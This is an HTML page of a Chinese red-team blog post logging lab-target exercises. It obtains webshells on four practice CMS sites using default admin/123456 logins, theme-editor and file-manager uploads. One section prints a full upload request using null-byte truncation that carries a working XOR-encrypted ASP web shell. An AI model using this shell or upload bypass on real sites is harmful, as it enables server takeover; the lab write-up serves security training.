@@ -1,0 +1,348 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>🐳毅种循环</title>
+<meta name="description" content="</br>西郊有密林，助君出重围。</br>
+</br># WhoAmI</br>
+</br># 毅种循环</br>" />
+<link rel="shortcut icon" href="https://redteamblog.icu/favicon.ico?v=1668483625774">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://redteamblog.icu/styles/main.css">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-226932280-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-226932280-1');
+</script>
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://redteamblog.icu">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://redteamblog.icu/images/avatar.png?v=1668483625774" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">🐳毅种循环</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            文章目录
+          </p>
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li><a href="#cbi1com">cbi1.com</a></li>
+<li><a href="#cbi2com">cbi2.com</a></li>
+<li><a href="#cbi3com">cbi3.com</a></li>
+<li><a href="#cbi7com">cbi7.com</a></li>
+</ul>
+
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="/" class="menu" style="animation-delay: 0s">
+          😀首页
+        </a>
+      
+    
+      
+        <a href="/posts" class="menu" style="animation-delay: 0.2s">
+          🦉文章列表
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.4s">
+          🤿归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu" style="animation-delay: 0.6000000000000001s">
+          🏄‍♀️标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu" style="animation-delay: 0.8s">
+          👹关于
+        </a>
+      
+    
+      
+        <a href="links/" class="menu" style="animation-delay: 1s">
+          友情链接
+        </a>
+      
+    
+      
+        <a href="/tag/wQ9CEdhmu" class="menu" style="animation-delay: 1.2000000000000002s">
+          🌿随笔
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700"></div>
+    <a class="rss" href="https://redteamblog.icu/atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">靶机日志-网站后台拿webshell篇</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2022-06-02 / 3 min read
+        </div>
+        
+          <img class="post-feature-image rounded-lg mx-auto my-4" src="https://api.ixiaowai.cn/api/api.php?=13" alt="">
+        
+        <div class="post-content yue">
+          <h1 id="cbi1com">cbi1.com</h1>
+<p>http://www.cbi1.com</p>
+<p>如图所示是一个WP</p>
+<p>扫描目录获得后台地址</p>
+<p>http://www.cbi1.com/wp-admin</p>
+<p>利用账号 admin 123456 进入后台。</p>
+<figure data-type="image" tabindex="1"><img src="https://redteamblog.icu/post-images/assets/image-20220601175006-j0fotyf.png" alt="image.png" loading="lazy"></figure>
+<p>直接找到后台主题编辑，向404文件写入一句话木马。</p>
+<figure data-type="image" tabindex="2"><img src="https://redteamblog.icu/post-images/assets/image-20220601180746-n810cbb.png" alt="image.png" loading="lazy"></figure>
+<p>观察他的url是在twentyten文件夹，说明木马生成在了twentyten文件夹下</p>
+<p>http://www.cbi1.com/wp-admin/theme-editor.php?file=404.php&amp;theme=twentysixteen&amp;scrollto=0</p>
+<p>访问url，成功getshell</p>
+<p>http://www.cbi1.com/wp-content/themes/twentysixteen/404.php</p>
+<figure data-type="image" tabindex="3"><img src="https://redteamblog.icu/post-images/assets/image-20220601180836-dtc8hoi.png" alt="image.png" loading="lazy"></figure>
+<p>蚁剑链接之。</p>
+<figure data-type="image" tabindex="4"><img src="https://redteamblog.icu/post-images/assets/image-20220601180650-e44vm4u.png" alt="image.png" loading="lazy"></figure>
+<p>此靶机完成。</p>
+<h1 id="cbi2com">cbi2.com</h1>
+<p>http://www.cbi2.com</p>
+<figure data-type="image" tabindex="5"><img src="https://redteamblog.icu/post-images/assets/image-20220601181023-70nqy7e.png" alt="image.png" loading="lazy"></figure>
+<p>织梦CMS。</p>
+<p>版本属于织梦V57，寻找该版本的漏洞。</p>
+<p>后台地址为：http://www.cbi2.com/dede/login.php</p>
+<p>使用弱口令admin+123456 进入后台</p>
+<figure data-type="image" tabindex="6"><img src="https://redteamblog.icu/post-images/assets/image-20220601183547-afzgzep.png" alt="image.png" loading="lazy"></figure>
+<p>使用后台的模块-文件管理器，写入一句话木马。</p>
+<figure data-type="image" tabindex="7"><img src="https://redteamblog.icu/post-images/assets/image-20220601183828-70jndp7.png" alt="image.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://redteamblog.icu/post-images/assets/image-20220601183923-womkpg9.png" alt="image.png" loading="lazy"></figure>
+<p>此靶机结束。</p>
+<h1 id="cbi3com">cbi3.com</h1>
+<p>http://www.cbi3.com</p>
+<p>程序为 上谷网络CMS 程序版本：V2.7.3 就是俗称的ASPCMS</p>
+<p>还是惯例老样子先搜索有没有相关漏洞。</p>
+<figure data-type="image" tabindex="9"><img src="https://redteamblog.icu/post-images/assets/image-20220601184133-3mmpl2g.png" alt="image.png" loading="lazy"></figure>
+<p>后台地址为：http://www.cbi3.com/admin_aspcms</p>
+<p>使用弱口令admin+123456登录</p>
+<h1 id="cbi7com">cbi7.com</h1>
+<p>http://www.cbi7.com</p>
+<p>是一个南方精良站点，比较老了，直接冲后台。</p>
+<p>http://www.cbi7.com/admin/Login.asp</p>
+<figure data-type="image" tabindex="10"><img src="https://redteamblog.icu/post-images/assets/image-20220601190420-x0huxai.png" alt="image.png" loading="lazy"></figure>
+<p>还是使用弱口令admin+123456进入后台</p>
+<figure data-type="image" tabindex="11"><img src="https://redteamblog.icu/post-images/assets/image-20220601190617-j22b9do.png" alt="image.png" loading="lazy"></figure>
+<p>后台寻找提权的方法。</p>
+<p>从后台上传logo的地方上传ASP马，此处使用hex的00截断即可。</p>
+<pre><code class="language-net">POST /admin/UpFileSave.asp?Result=SiteLogo HTTP/1.1
+Host: www.cbi7.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------86330808336652313213298033082
+Content-Length: 815
+Origin: http://www.cbi7.com
+DNT: 1
+Connection: close
+Referer: http://www.cbi7.com/admin/UpFileForm.asp?Result=SiteLogo
+Cookie: ASPSESSIONIDCSTDCRSS=DIAFMMJDPPABFGLBADLNAPGL
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+-----------------------------86330808336652313213298033082
+Content-Disposition: form-data; name=&quot;FromFile&quot;; filename=&quot;shell1.jpg&quot;
+Content-Type: image/jpeg
+
+&lt;%
+Response.CharSet = &quot;UTF-8&quot; 
+k=&quot;e45e329feb5d925b&quot; '该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
+Session(&quot;k&quot;)=k
+size=Request.TotalBytes
+content=Request.BinaryRead(size)
+For i=1 To size
+result=result&amp;Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))
+Next
+execute(result)
+%&gt;
+-----------------------------86330808336652313213298033082
+Content-Disposition: form-data; name=&quot;SaveToPath&quot;
+
+../Upload/PicFiles/shell1.asp
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://redteamblog.icu/post-images/assets/image-20220601192656-9ldu70r.png" alt="image.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://redteamblog.icu/post-images/assets/image-20220601192704-phd0swf.png" alt="image.png" loading="lazy"></figure>
+<p>此靶机完成。</p>
+<p>靶机相对简单，更多的是对于一个进入后台之后的拿webshell的打法。还有一些因为时间原因没做完，附一份参考答案。</p>
+<p><a href="https://redteamblog.icu/post-images/assets/%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%8B%BFwebshell%E7%AF%87-20220602143324-ojyclvd.pdf">网站后台拿webshell篇.pdf</a></p>
+
+        </div>
+
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://redteamblog.icu/tag/rOzFKO8rf/">
+            <span class="flex-auto">靶机日志</span>
+          </a>
+        
+
+
+        <div class="flex justify-between py-8">
+          
+            <div class="prev-post">
+              <a href="https://redteamblog.icu/post/靶机日志-2019-1388提权/">
+                <h3 class="post-title">
+                  <i class="ri-arrow-left-line"></i>
+                  靶机日志-2019-1388提权篇
+                </h3>
+              </a>
+            </div>
+          
+
+          
+            <div class="next-post">
+              <a href="https://redteamblog.icu/post/xian/">
+                <h3 class="post-title">
+                  闲
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+
+      </div>
+    </div>
+
+    <script src="https://redteamblog.icu/media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
